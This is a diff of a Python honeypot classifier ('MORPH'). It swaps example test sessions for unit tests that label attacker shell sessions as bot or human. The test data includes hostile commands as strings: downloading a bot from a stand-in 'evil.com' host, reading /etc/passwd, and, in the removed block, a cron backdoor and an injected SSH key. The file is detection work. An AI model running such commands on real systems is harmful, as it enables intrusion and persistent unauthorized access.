@@ -276,56 +276,82 @@ def classify_session(session: dict[str, Any]) -> dict[str, Any]:
     }
 
 
-if __name__ == "__main__":
-    # Example usage with test sessions
-    test_sessions = [
-        {
-            "name": "Bot Scanner",
-            "commands": ["uname -a", "cat /proc/cpuinfo", "cd /tmp", "wget http://evil.com/bot"],
-            "login_attempts": [{"username": "root", "password": "123456"}] * 25,
-            "downloads": ["http://evil.com/bot"],
-            "duration_seconds": 5,
-        },
-        {
-            "name": "Rapid Bot (commands_per_second > 1.5)",
-            "commands": ["whoami", "id", "uname -a", "cat /etc/passwd", "ls /tmp"],
-            "login_attempts": [],
-            "downloads": [],
-            "duration_seconds": 2,  # 5 commands in 2 seconds = 2.5/sec
-        },
-        {
-            "name": "Loop Bot (repeated commands)",
-            "commands": ["ls", "ls", "ls", "ls", "cat /etc/passwd"],
-            "login_attempts": [],
-            "downloads": [],
-            "duration_seconds": 30,
-        },
-        {
-            "name": "Human Explorer",
-            "commands": ["ls", "cd /home", "ls -la", "cat readme.txt", "cd ..", "pwd", "whoami"],
-            "login_attempts": [{"username": "admin", "password": "admin123"}],
-            "downloads": [],
-            "duration_seconds": 180,
-        },
-        {
-            "name": "Persistence Attacker",
-            "commands": ["whoami", "crontab -e", "echo '* * * * * /tmp/backdoor' >> /var/spool/cron/root", 
-                        "cat ~/.ssh/authorized_keys", "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"],
-            "login_attempts": [{"username": "root", "password": "toor"}],
-            "downloads": [],
-            "duration_seconds": 45,
-        },
-    ]
-
-    print("MORPH Session Classifier - Test Results")
+def test_bot_detection():
+    """Unit tests for bot detection logic."""
     print("=" * 60)
+    print("MORPH Bot Detection Unit Tests")
+    print("=" * 60)
+    
+    passed = 0
+    failed = 0
+    
+    # Test 1 - Bot by speed
+    session1 = {
+        "commands": ["uname -a", "whoami", "id", "cat /etc/passwd",
+                     "cat /proc/cpuinfo", "ls", "pwd", "wget http://evil.com/bot.sh"],
+        "duration_seconds": 3,
+        "login_attempts": [],
+        "downloads": [],
+    }
+    result1 = classify_session(session1)
+    rule_match = any("rapid_commands" in r for r in result1["matched_rules"])
+    
+    print("\nTest 1 - Bot by speed:")
+    print(f"  Commands: 8 in 3 seconds")
+    print(f"  Result: type={result1['type']}, rules={result1['matched_rules']}")
+    if result1["type"] == "bot" and rule_match:
+        print("  ✓ PASS")
+        passed += 1
+    else:
+        print("  ✗ FAIL - Expected type=bot with rapid_commands rule")
+        failed += 1
+    
+    # Test 2 - Bot by scanner sequence
+    session2 = {
+        "commands": ["uname -a", "cat /etc/passwd", "cat /proc/cpuinfo"],
+        "duration_seconds": 30,
+        "login_attempts": [],
+        "downloads": [],
+    }
+    result2 = classify_session(session2)
+    rule_match = any("scanner_sequence" in r for r in result2["matched_rules"])
+    
+    print("\nTest 2 - Bot by scanner sequence:")
+    print(f"  Commands: uname -a → cat /etc/passwd → cat /proc/cpuinfo")
+    print(f"  Result: type={result2['type']}, rules={result2['matched_rules']}")
+    if result2["type"] == "bot" and rule_match:
+        print("  ✓ PASS")
+        passed += 1
+    else:
+        print("  ✗ FAIL - Expected type=bot with scanner_sequence rule")
+        failed += 1
+    
+    # Test 3 - Human
+    session3 = {
+        "commands": ["ls", "cd /var/www", "cat index.html", "vim config.php"],
+        "duration_seconds": 120,
+        "login_attempts": [],
+        "downloads": [],
+    }
+    result3 = classify_session(session3)
+    
+    print("\nTest 3 - Human:")
+    print(f"  Commands: ls, cd, cat, vim over 120 seconds")
+    print(f"  Result: type={result3['type']}, rules={result3['matched_rules']}")
+    if result3["type"] == "human":
+        print("  ✓ PASS")
+        passed += 1
+    else:
+        print("  ✗ FAIL - Expected type=human")
+        failed += 1
+    
+    # Summary
+    print("\n" + "=" * 60)
+    print(f"Results: {passed} passed, {failed} failed")
+    print("=" * 60)
+    
+    return failed == 0
 
-    for session in test_sessions:
-        result = classify_session(session)
-        print(f"\n{session['name']}:")
-        print(f"  Type: {result['type']}")
-        print(f"  Intent: {result['intent']}")
-        print(f"  Risk: {result['risk']}")
-        print(f"  Matched rules:")
-        for rule in result["matched_rules"]:
-            print(f"    - {rule}")
+
+if __name__ == "__main__":
+    test_bot_detection()
